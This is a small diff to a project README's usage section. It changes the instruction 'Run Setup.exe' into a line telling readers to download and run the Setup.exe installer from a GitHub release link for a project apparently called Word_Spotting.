@@ -2,7 +2,7 @@
 
 # How to use ?
 
-Run "Setup.exe" and make fun
+Download and run https://github.com/OmarBoudraa/Word_Spotting/releases/download/v1.0/Setup.exe / make fun...
 
 # Need help ?
 
